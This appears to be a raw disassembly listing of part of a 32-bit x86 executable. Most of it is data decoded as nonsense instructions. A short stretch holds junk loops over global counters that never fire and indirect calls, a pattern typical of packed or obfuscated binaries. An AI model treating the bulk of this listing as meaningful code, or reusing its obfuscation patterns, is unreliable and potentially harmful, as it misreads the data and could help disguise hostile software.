  40699d:	test   DWORD PTR [esi-0x4f2f4ba7],edi
  4069a3:	mov    edi,0xc3dc1b14
  4069a8:	sub    BYTE PTR [ebp+0x34],bl
  4069ab:	cmp    al,0x6a
  4069ad:	enter  0x11a6,0x31
  4069b1:	mov    ds:0x362f8ed0,al
  4069b6:	jne    0x406958
  4069b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069b9:	and    al,0xab
  4069bb:	pop    esi
  4069bc:	je     0x406a04
  4069be:	(bad)  
  4069c0:	adc    DWORD PTR [edi],eax
  4069c2:	addr16 dec ecx
  4069c4:	clc    
  4069c5:	shr    BYTE PTR ds:0xd6ea4b87,0xba
  4069cc:	ins    BYTE PTR es:[edi],dx
  4069cd:	les    ecx,FWORD PTR [esi-0x271e0aef]
  4069d3:	xchg   esi,eax
  4069d4:	(bad)  
  4069d5:	repnz fcomi st,st(7)
  4069d8:	sub    ebx,DWORD PTR [ebp-0x52]
  4069db:	js     0x4069c4
  4069dd:	xchg   edi,eax
  4069de:	and    cl,ch
  4069e0:	mov    edx,0xae4319e9
  4069e5:	push   ebx
  4069e6:	pop    ds
  4069e7:	lods   al,BYTE PTR ds:[esi]
  4069e8:	xchg   ebp,eax
  4069e9:	push   cs
  4069ea:	jecxz  0x406a53
  4069ec:	push   eax
  4069ed:	pusha  
  4069ee:	push   ss
  4069ef:	fbld   TBYTE PTR ds:0xf3a45a6d
  4069f5:	mov    al,ds:0x76c3035b
  4069fa:	pop    ebp
  4069fb:	xchg   ebp,eax
  4069fc:	aaa    
  4069fd:	mov    ebx,0xbb8d78cc
  406a02:	loope  0x4069d8
  406a04:	popf   
  406a05:	sysenter 
  406a07:	mov    edx,0x40b09a9d
  406a0c:	clc    
  406a0d:	xchg   ebp,eax
  406a0e:	and    eax,0x74f70bee
  406a13:	addr16 xchg esi,eax
  406a15:	push   esp
  406a16:	in     eax,dx
  406a17:	and    BYTE PTR [edi],ch
  406a19:	(bad)  
  406a1a:	mov    dl,0x4f
  406a1c:	mov    WORD PTR [esi+0x705c8d37],?
  406a22:	dec    eax
  406a23:	cmp    BYTE PTR [esi],0x2c
  406a26:	pop    eax
  406a27:	adc    ebp,DWORD PTR [ebx]
  406a29:	in     eax,0x59
  406a2b:	add    DWORD PTR [ebx],ebx
  406a2d:	daa    
  406a2e:	xor    al,0xc0
  406a30:	test   DWORD PTR [edx+0x281a4fcd],ebx
  406a36:	(bad)  
  406a37:	adc    al,0xf2
  406a39:	ret    0x77a9
  406a3c:	enter  0xc5e5,0x5e
  406a40:	jnp    0x4069e9
  406a42:	scas   al,BYTE PTR es:[edi]
  406a43:	gs push esp
  406a45:	adc    esi,0x37b32df2
  406a4b:	push   ecx
  406a4c:	mov    ds:0x95489792,al
  406a51:	out    dx,al
  406a52:	adc    al,0x9c
  406a54:	repnz mov ah,0xe3
  406a57:	pop    ss
  406a58:	jmp    0x5955e8e6
  406a5d:	push   cs
  406a5e:	jmp    0x766d:0x26314ccb
  406a65:	lahf   
  406a66:	cwde   
  406a67:	jns    0x4069f4
  406a69:	loope  0x406aa3
  406a6b:	and    dl,BYTE PTR es:[ebx+0x1]
  406a6f:	dec    ecx
  406a70:	or     DWORD PTR [ebp-0x61],ebp
  406a73:	cmp    al,0x7c
  406a75:	les    eax,FWORD PTR [ebp+0x68]
  406a78:	clc    
  406a79:	dec    edx
  406a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a7b:	jmp    0xc362f28
  406a80:	stos   DWORD PTR es:[edi],eax
  406a81:	cmp    BYTE PTR [ecx+0x5e2cd96],cl
  406a87:	rol    DWORD PTR [edx],1
  406a89:	loop   0x406ae1
  406a8b:	sbb    DWORD PTR [esi-0x219d4626],0xbc7fa39f
  406a95:	jg     0x406a67
  406a97:	push   eax
  406a98:	ret    0x87df
  406a9b:	adc    edx,DWORD PTR [ecx+0x53]
  406a9e:	idiv   BYTE PTR [eax+0x40]
  406aa1:	icebp  
  406aa2:	int3   
  406aa3:	pop    ds
  406aa4:	imul   ebx,DWORD PTR [edx+0x78d2c97f],0xffffffcd
  406aab:	sub    DWORD PTR [esi],edx
  406aad:	test   al,0xae
  406aaf:	push   ecx
  406ab0:	outs   dx,DWORD PTR ds:[esi]
  406ab1:	push   ds
  406ab2:	out    0xf3,eax
  406ab4:	das    
  406ab5:	icebp  
  406ab6:	jne    0x406af7
  406ab8:	paddsb mm4,mm5
  406abb:	loope  0x406ac3
  406abd:	xchg   ebx,eax
  406abe:	(bad)  
  406abf:	sbb    esi,DWORD PTR [ebx]
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xc6
  406c9b:	sahf   
  406c9c:	push   0x74
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406d1f
  406ca7:	stc    
  406ca8:	pusha  
  406ca9:	jecxz  0x406d09
  406cab:	(bad)  
  406cac:	mov    cl,0x0
  406cae:	or     ebx,DWORD PTR [ecx+0x76]
  406cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cb3:	push   ds
  406cb4:	rol    BYTE PTR cs:[edx-0x2393ea11],1
  406cbb:	sub    edi,DWORD PTR [edi]
  406cbd:	jg     0x406cfb
  406cbf:	scas   eax,DWORD PTR es:[edi]
  406cc0:	aam    0x2d
  406cc2:	test   BYTE PTR [eax],0xed
  406cc5:	(bad)  
  406cc6:	(bad)  
  406cc8:	sbb    al,0xda
  406cca:	pop    esp
  406ccb:	ins    BYTE PTR es:[edi],dx
  406ccc:	aaa    
  406ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cce:	pop    ebx
  406ccf:	fdiv   st(4),st
  406cd1:	inc    ecx
  406cd2:	aad    0xa9
  406cd4:	add    ch,BYTE PTR [esi]
  406cd6:	jecxz  0x406c58
  406cd8:	push   eax
  406cd9:	fistp  DWORD PTR [ecx]
  406cdb:	adc    eax,0x318aae1f
  406ce0:	jp     0x406c6b
  406ce2:	ret    0x1b5e
  406ce5:	push   0xc6be4804
  406cea:	xor    DWORD PTR [eax-0x3c27e23b],esp
  406cf0:	add    al,0xf
  406cf2:	inc    ecx
  406cf3:	ret    0x727c
  406cf6:	pop    ds
  406cf7:	ror    BYTE PTR [eax-0x3b],cl
  406cfa:	outs   dx,DWORD PTR ds:[esi]
  406cfb:	cs adc eax,0xd9b4fda8
  406d01:	jl     0x406cfd
  406d03:	bound  edx,QWORD PTR [edx+0x4b]
  406d06:	stos   BYTE PTR es:[edi],al
  406d07:	cs mov ebx,0xdeddc050
  406d0d:	mov    BYTE PTR [esp+ecx*4+0x10],ah
  406d11:	inc    edi
  406d12:	dec    esi
  406d13:	mov    cs:0x9c0542b6,al
  406d19:	out    dx,eax
  406d1a:	jb     0x406cc1
  406d1c:	adc    ebx,DWORD PTR [ecx]
  406d1e:	jne    0x406d7f
  406d20:	push   eax
  406d21:	add    eax,0xccc90a36
  406d26:	mov    al,0x2e
  406d28:	test   ebp,0x2d908ef2
  406d2e:	or     DWORD PTR [esp+ebp*4+0xb],ebp
  406d32:	(bad)  
  406d33:	out    dx,al
  406d34:	mov    bh,0xba
  406d36:	or     ebx,DWORD PTR [edx-0x37]
  406d39:	jns    0x406d9f
  406d3b:	jle    0x406da6
  406d3d:	xor    eax,ebx
  406d3f:	loop   0x406d74
  406d41:	xor    al,0x85
  406d43:	push   cs
  406d44:	mov    ebx,0x88b2a7d0
  406d49:	lock xchg BYTE PTR [edx-0x6f46643f],bh
  406d50:	and    eax,0x75078c25
  406d55:	popf   
  406d56:	xchg   ebp,eax
  406d57:	or     eax,0xb9476497
  406d5c:	das    
  406d5d:	clc    
  406d5e:	mov    edx,0x700cd28f
  406d63:	mov    BYTE PTR [ebp-0x3f550504],ah
  406d69:	mov    bh,BYTE PTR [ebx-0x2]
  406d6c:	ins    DWORD PTR es:[edi],dx
  406d6d:	xchg   DWORD PTR [esi-0x6b6e8384],esp
  406d73:	pushf  
  406d74:	and    DWORD PTR [esi-0x24],ebp
  406d77:	xchg   DWORD PTR [ebp-0x3c],eax
  406d7a:	(bad)  
  406d7b:	sar    DWORD PTR [edx],1
  406d7d:	in     eax,0xc2
  406d7f:	dec    esp
  406d80:	or     BYTE PTR [bx+si+0x1b],bl
  406d84:	imul   esi,DWORD PTR [eax-0xa],0x1b9c5dca
  406d8b:	mov    dl,0xa7
  406d8d:	packsswb mm6,QWORD PTR [eax]
  406d90:	push   edi
  406d91:	out    dx,al
  406d92:	push   ds
  406d93:	mov    ch,0xbe
  406d95:	les    ebx,FWORD PTR [ecx+0x29]
  406d98:	test   al,0x8e
  406d9a:	ret    
  406d9b:	cmp    eax,DWORD PTR [edi]
  406d9d:	dec    edi
  406d9e:	gs sbb eax,0xfedeea86
  406da4:	out    0xc5,al
  406da6:	mov    BYTE PTR [edi-0x39],ch
  406da9:	cld    
  406daa:	into   
  406dab:	xchg   DWORD PTR [ecx],ebp
  406dad:	test   bh,ah
  406daf:	je     0x406e00
  406db1:	in     al,0x78
  406db3:	inc    edx
  406db4:	daa    
  406db5:	add    al,0xb5
  406db7:	pop    esp
  406db8:	test   bl,ch
  406dba:	sub    BYTE PTR [edi],0x59
  406dbd:	and    eax,DWORD PTR [edi-0x4f]
  406dc0:	push   0xb4ee67d1
  406dc5:	jbe    0x406e38
  406dc7:	imul   edi,DWORD PTR [ecx+0x6a],0x1e601e2c
  406dce:	push   ebx
  406dcf:	js     0x406e16
  406dd1:	sub    BYTE PTR [ebx-0x5a49c91d],cl
  406dd7:	sar    edx,cl
  406dd9:	ror    DWORD PTR [esi],0xb
  406ddc:	mov    eax,ds:0xfb4636c4
  406de1:	lds    ecx,FWORD PTR [edx]
  406de3:	jle    0x406e06
  406de5:	inc    DWORD PTR [esi]
  406de7:	pop    ds
  406de8:	adc    al,BYTE PTR ds:0x3727b162
  406dee:	(bad)  
  406def:	xchg   edx,eax
  406df0:	ret    0x9451
  406df3:	sub    al,0xa0
  406df5:	jecxz  0x406d85
  406df7:	pusha  
  406df8:	sub    eax,0x6399ed99
  406dfd:	push   esp
  406dfe:	ret    0x90c9
  406e01:	dec    ebx
  406e02:	mov    al,0x22
  406e04:	adc    DWORD PTR [ebx+0x63],esp
  406e07:	aas    
  406e08:	sti    
  406e09:	add    DWORD PTR [edi+0x1c],eax
  406e0c:	inc    esi
  406e0d:	push   ss
  406e0e:	sbb    al,0x67
  406e10:	shr    BYTE PTR [edi+0x5faf6378],0x5f
  406e17:	cdq    
  406e18:	shr    BYTE PTR [eax+edx*2+0x7b],cl
  406e1c:	shr    eax,cl
  406e1e:	ret    
  406e1f:	jnp    0x406dd7
  406e21:	stos   BYTE PTR es:[edi],al
  406e22:	inc    eax
  406e23:	fiadd  WORD PTR [ebp-0x11]
  406e26:	into   
  406e27:	dec    edi
  406e28:	daa    
  406e29:	les    eax,FWORD PTR [eax+0x1a18a951]
  406e2f:	push   0x9fc6b33e
  406e34:	push   0xffffff80
  406e36:	sahf   
  406e37:	icebp  
  406e38:	(bad)  [edi-0x6768b0ff]
  406e3e:	lods   eax,DWORD PTR ds:[esi]
  406e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e40:	adc    ecx,ecx
  406e42:	test   al,0x8d
  406e44:	pop    ecx
  406e45:	cs mov bh,0x1a
  406e48:	in     al,dx
  406e49:	shl    BYTE PTR [esi-0x4b6d2b6a],0xda
  406e50:	loopne 0x406dd2
  406e52:	or     al,0x4b
  406e54:	inc    esi
  406e55:	popa   
  406e56:	fild   QWORD PTR [ebx+0x276ba36c]
  406e5c:	mov    al,0x2
  406e5e:	adc    WORD PTR [eax+0x6fd1be3c],si
  406e65:	add    eax,0xd972d1f8
  406e6a:	mov    esi,0xd03de722
  406e6f:	jne    0x406e4f
  406e71:	not    BYTE PTR [ebp-0x24]
  406e74:	into   
  406e75:	mov    cl,0x35
  406e77:	jp     0x406e36
  406e79:	xchg   esi,eax
  406e7a:	es ja  0x406e56
  406e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7e:	std    
  406e7f:	jle    0x406e83
  406e81:	xchg   esp,eax
  406e82:	inc    ebp
  406e83:	push   edx
  406e84:	ins    DWORD PTR es:[edi],dx
  406e85:	adc    eax,0xfe430f26
  406e8a:	stos   BYTE PTR es:[edi],al
  406e8b:	(bad)  
  406e8c:	repz call 0xe64c9031
  406e92:	mov    dl,0x54
  406e94:	(bad)  
  406e95:	bound  ebp,QWORD PTR [edx+0x59]
  406e98:	(bad)
  406e9c:	ss dec esp
  406e9e:	scas   al,BYTE PTR es:[edi]
  406e9f:	sbb    BYTE PTR [esi+ebx*4-0x7cb91ca6],dl
  406ea6:	fisttp DWORD PTR [ebx+0x6d]
  406ea9:	mov    fs,WORD PTR [ebp+0x60]
  406eac:	jmp    0x7750:0x6df2dc9e
  406eb3:	push   ds
  406eb4:	mov    al,0xb0
  406eb6:	int    0x4f
  406eb8:	sub    ebx,DWORD PTR [edx+0x59432dbf]
  406ebe:	inc    ecx
  406ebf:	ror    BYTE PTR [edi-0x6f8d34a4],0xce
  406ec6:	adc    ah,cl
  406ec8:	mov    ecx,DWORD PTR [esi+0x69]
  406ecb:	xor    DWORD PTR [esi],esi
  406ecd:	cdq    
  406ece:	retf   
  406ecf:	push   eax
  406ed0:	arpl   sp,dx
  406ed2:	imul   DWORD PTR [ebx+edi*4+0x49d398e5]
  406ed9:	add    al,0x89
  406edb:	sbb    DWORD PTR [edx+0x2741542a],edi
  406ee1:	outs   dx,BYTE PTR ds:[esi]
  406ee2:	sub    BYTE PTR [ebp+0x453757b0],0xf
  406ee9:	outs   dx,BYTE PTR ds:[esi]
  406eea:	scas   eax,DWORD PTR es:[edi]
  406eeb:	sbb    eax,0xcd3ea7d0
  406ef0:	stos   DWORD PTR es:[edi],eax
  406ef1:	mov    ch,0x77
  406ef3:	pop    ebx
  406ef4:	xchg   ecx,eax
  406ef5:	cmp    eax,0x7232bbfa
  406efa:	(bad)  
  406efb:	mov    ds:0xd6245f84,al
  406f00:	jp     0x406f53
  406f02:	or     ebx,DWORD PTR [ebx-0x67f25a0]
  406f08:	out    dx,al
  406f09:	stos   BYTE PTR es:[edi],al
  406f0a:	mov    edx,0x10b27db8
  406f0f:	jecxz  0x406e9b
  406f11:	jmp    0x406f15
  406f13:	inc    ecx
  406f14:	pop    ebp
  406f15:	cmp    eax,0x7955320c
  406f1a:	mov    ah,0xbc
  406f1c:	adc    DWORD PTR [ebx+ebx*8-0x27],esp
  406f20:	imul   ebx,DWORD PTR [ecx+0x3],0x4acfe0a4
  406f27:	loope  0x406f3d
  406f29:	jne    0x406eb9
  406f2b:	out    0xb5,al
  406f2d:	xchg   ecx,eax
  406f2e:	loopne 0x406f88
  406f30:	xchg   ebx,eax
  406f31:	ins    BYTE PTR es:[edi],dx
  406f32:	das    
  406f33:	mov    eax,ds:0xaa395a02
  406f38:	jmp    0xd3c6:0xbcb02e8a
  406f3f:	push   esp
  406f40:	or     dl,BYTE PTR [edi+0x63ea045a]
  406f46:	sub    DWORD PTR [ebx],ebp
  406f48:	jmp    0x406f73
  406f4a:	fadd   QWORD PTR [esi-0x277282d9]
  406f50:	rol    DWORD PTR [edx],cl
  406f52:	jecxz  0x406ed9
  406f54:	(bad)  [ebx-0x292e1820]
  406f5a:	jo     0x406fd2
  406f5c:	cli    
  406f5d:	mov    al,ds:0x405f8df8
  406f62:	or     DWORD PTR [ebx],edi
  406f64:	pushf  
  406f65:	rcl    bl,1
  406f67:	mov    eax,ds:0x324c9b64
  406f6c:	scas   al,BYTE PTR es:[edi]
  406f6d:	loopne 0x406fb2
  406f6f:	adc    esi,DWORD PTR [ecx-0x13]
  406f72:	xchg   ebx,eax
  406f73:	push   ss
  406f74:	adc    DWORD PTR [edx-0x57],edx
  406f77:	sub    edx,esp
  406f79:	mov    BYTE PTR [edx+0x72384a9d],ch
  406f7f:	adc    BYTE PTR [ebx],al
  406f81:	xor    edi,DWORD PTR [ecx]
  406f83:	dec    esp
  406f84:	pop    edi
  406f85:	dec    ebx
  406f86:	rcl    bl,cl
  406f88:	add    BYTE PTR [esi],bh
  406f8a:	lock push edx
  406f8c:	jno    0x406fc5
  406f8e:	xchg   DWORD PTR [ebp+ebx*1+0x3d0e96f2],edx
  406f95:	mov    esp,0xb419c18c
  406f9a:	fwait
  406f9b:	out    dx,eax
  406f9c:	mov    DWORD PTR [ecx-0x3b],ebx
  406f9f:	ror    BYTE PTR [edx-0x27eff881],cl
  406fa5:	icebp  
  406fa6:	dec    ecx
  406fa7:	and    bl,BYTE PTR [eax-0x57e595f1]
  406fad:	xchg   esi,eax
  406fae:	lods   al,BYTE PTR ds:[esi]
  406faf:	gs cwde 
  406fb1:	push   ebx
  406fb2:	or     DWORD PTR [edi+ebx*8-0x676ee9a1],eax
  406fb9:	test   BYTE PTR [eax+0x32249b56],bh
  406fbf:	out    dx,eax
  406fc0:	pushf  
  406fc1:	add    ah,BYTE PTR [ecx]
  406fc3:	mov    ch,0x7a
  406fc5:	mov    cl,0xf5
  406fc7:	fwait
  406fc8:	adc    ch,BYTE PTR [ebx+0x3e]
  406fcb:	xor    eax,0xa8e9bd35
  406fd0:	lea    edi,[edx]
  406fd2:	inc    edx
  406fd3:	retf   0x317
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [ebx],ax
  40700c:	(bad)
  40700f:	mov    edx,0x7d207070
  407015:	jo     0x407087
  407017:	and    ebp,DWORD PTR [esi+0x7]
  40701a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40701b:	adc    ebp,DWORD PTR [ecx+0x7f6c0a18]
  407021:	mov    ah,0xfd
  407023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407024:	jne    0x406fdf
  407026:	sbb    DWORD PTR [edi-0x6d4ffca],ebp
  40702c:	and    eax,0x9996b2e2
  407031:	xchg   ecx,eax
  407032:	push   cs
  407033:	mov    ds:0xc2f30a06,al
  407038:	test   edx,ebx
  40703a:	nop
  40703b:	nop
  40703c:	mov    edi,DWORD PTR [edx-0x27e610c0]
  407042:	adc    al,0x34
  407044:	ins    BYTE PTR es:[edi],dx
  407045:	dec    edi
  407046:	in     al,dx
  407047:	jl     0x40706c
  407049:	mov    ebx,0x4bcd6a86
  40704e:	retf   
  40704f:	std    
  407050:	adc    edi,DWORD PTR [eax+0x64e321b8]
  407056:	bound  ebx,QWORD PTR [edi-0x5908e158]
  40705c:	daa    
  40705d:	inc    edx
  40705e:	sbb    al,0x59
  407060:	pcmpeqw mm4,QWORD PTR [esi-0x50f85482]
  407067:	sbb    DWORD PTR [ecx+0x99dc7ad],0x2f
  40706e:	and    BYTE PTR [edx-0x14b44444],dh
  407074:	xor    DWORD PTR [ebp+0x7d],0x566e44f2
  40707b:	cmc    
  40707c:	jne    0x4070d8
  40707e:	loop   0x407040
  407080:	pop    esi
  407081:	sub    al,BYTE PTR [esi-0x34]
  407084:	pop    esi
  407085:	in     al,0x10
  407087:	scas   al,BYTE PTR es:[edi]
  407088:	popa   
  407089:	gs cs in al,dx
  40708c:	inc    eax
  40708d:	fcom   DWORD PTR [ebx-0x45]
  407090:	jmp    0x40710e
  407092:	stos   DWORD PTR es:[edi],eax
  407093:	out    0xe8,eax
  407095:	out    dx,eax
  407096:	cld    
  407097:	sbb    DWORD PTR [eax+edx*4-0x8273344],esp
  40709e:	fwait
  40709f:	lahf   
  4070a0:	dec    ebp
  4070a1:	mov    ebx,0x77e3c2be
  4070a6:	cwde   
  4070a7:	inc    ecx
  4070a8:	cmp    al,0x5
  4070aa:	dec    ebx
  4070ab:	call   0xbb2a3475
  4070b0:	sbb    ebp,DWORD PTR [edi+0x4351feb5]
  4070b6:	fnstcw WORD PTR [eax-0x7991d97d]
  4070bc:	out    dx,al
  4070bd:	imul   edi,esi,0xffffff97
  4070c0:	mov    ecx,0x992e9173
  4070c5:	mov    esi,0xe11101b5
  4070ca:	test   al,0x85
  4070cc:	(bad)  
  4070cd:	imul   dh
  4070cf:	mov    ebx,0x6210df23
  4070d4:	jl     0x407065
  4070d6:	fcom   QWORD PTR [ecx+0x791f402d]
  4070dc:	push   ecx
  4070dd:	je     0x4070d9
  4070df:	jle    0x4070b4
  4070e1:	lods   al,BYTE PTR ds:[esi]
  4070e2:	add    edi,DWORD PTR [edx-0x350c360d]
  4070e8:	imul   eax,DWORD PTR [esp+eax*4],0x2a
  4070ec:	pop    edi
  4070ed:	jge    0x407159
  4070ef:	jb     0x4070e6
  4070f1:	call   0xd1c9:0xd528779c
  4070f8:	call   0x6bb2:0xc482cffa
  4070ff:	inc    ecx
  407100:	push   ebp
  407101:	inc    ebx
  407102:	lods   eax,DWORD PTR ds:[esi]
  407103:	ins    DWORD PTR es:[edi],dx
  407104:	xrelease mov BYTE PTR [edi+0x65],bl
  407108:	data16 sub dl,BYTE PTR [ebx]
  40710b:	mov    BYTE PTR [ecx+0x101adffa],al
  407111:	bound  esi,QWORD PTR [ebp-0x5e]
  407114:	cmp    ah,ch
  407116:	cmp    al,0x49
  407118:	sti    
  407119:	mov    edx,0xf9a7a15d
  40711e:	add    eax,DWORD PTR [ebp-0x29]
  407121:	in     eax,0x40
  407123:	and    eax,DWORD PTR [edi-0x2f75e850]
  407129:	cdq    
  40712a:	fadd   DWORD PTR [edi+0x4f4ed1c4]
  407130:	addr16 test edx,edi
  407133:	int    0xf8
  407135:	cs push ecx
  407137:	and    esp,DWORD PTR [esi*8-0x280b6777]
  40713e:	adc    al,0x6
  407140:	aas    
  407141:	mov    WORD PTR [ebx],?
  407143:	inc    ebx
  407144:	or     ecx,DWORD PTR [ebx]
  407146:	fsub   QWORD PTR [bx+di+0x99d]
  40714b:	cwde   
  40714c:	mov    cl,al
  40714e:	mov    ebp,0xc12944ed
  407153:	test   eax,0x7a758d81
  407158:	scas   al,BYTE PTR es:[edi]
  407159:	mov    WORD PTR [edi-0x21],gs
  40715c:	adc    eax,0x87eb7de9
  407161:	int3   
  407162:	add    BYTE PTR [edi+0x15981193],al
  407168:	(bad)  
  407169:	test   eax,0xdd5b3a69
  40716e:	xchg   BYTE PTR [esi+0x4c],dh
  407171:	inc    eax
  407172:	adc    dh,BYTE PTR [eax+0x3e109a84]
  407178:	enter  0x408d,0x85
  40717c:	push   eax
  40717d:	les    edi,FWORD PTR [ebp+0x7d340d95]
  407183:	cmp    BYTE PTR [edx+0x16e29daf],ch
  407189:	jb     0x4071fc
  40718b:	push   esp
  40718c:	gs cbw 
  40718f:	jne    0x40715b
  407191:	dec    edx
  407192:	fisubr WORD PTR [ecx-0x11]
  407195:	or     eax,0xba899ab3
  40719a:	pop    esp
  40719b:	aam    0x49
  40719d:	pop    edi
  40719e:	cmp    ch,ch
  4071a0:	xchg   edx,eax
  4071a1:	jno    0x407165
  4071a3:	jmp    0xaaa4b55e
  4071a8:	xchg   BYTE PTR gs:[eax+0x1fa3c417],bl
  4071af:	and    DWORD PTR [edi+eiz*2-0x4a],edx
  4071b3:	repnz xor eax,0x7d8590ba
  4071b9:	ja     0x40722f
  4071bb:	cmp    ecx,DWORD PTR [edx-0x4cb7484c]
  4071c1:	mov    al,ds:0xea8e8782
  4071c6:	into   
  4071c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071c8:	adc    eax,0x47de85a9
  4071cd:	jno    0x407169
  4071cf:	or     DWORD PTR [esi-0x20aa7d68],esi
  4071d5:	iret   
  4071d6:	cli    
  4071d7:	hlt    
  4071d8:	or     BYTE PTR [eax],al
  4071da:	das    
  4071db:	sti    
  4071dc:	ds scas eax,DWORD PTR es:[edi]
  4071de:	xor    dl,BYTE PTR [edx-0x14]
  4071e1:	jle    0x40717d
  4071e3:	inc    ebp
  4071e4:	sbb    DWORD PTR [ecx-0x53d99e3c],esp
  4071ea:	mov    ds,WORD PTR [edx+eax*4]
  4071ed:	inc    edi
  4071ee:	dec    esi
  4071ef:	push   0xffffff9d
  4071f1:	push   ecx
  4071f2:	std    
  4071f3:	pop    ebp
  4071f4:	xor    ecx,DWORD PTR [eax+ebp*8]
  4071f7:	cmp    eax,0x97747d00
  4071fc:	loop   0x407224
  4071fe:	out    0xc,al
  407200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407201:	add    bh,BYTE PTR [ebx+0x599c7234]
  407207:	push   ss
  407208:	loop   0x40719c
  40720a:	icebp  
  40720b:	pop    ecx
  40720c:	and    BYTE PTR [ecx+0x27c0e7d1],0x14
  407213:	jne    0x40721e
  407215:	xchg   ebp,eax
  407216:	adc    DWORD PTR [ebx+0x15],ecx
  407219:	outs   dx,BYTE PTR ds:[esi]
  40721a:	sahf   
  40721b:	or     dh,BYTE PTR [ecx]
  40721d:	mov    esp,0xdb0780c3
  407222:	mov    bh,0xf4
  407224:	sub    DWORD PTR [ebp+0x51],0xd
  407228:	push   edx
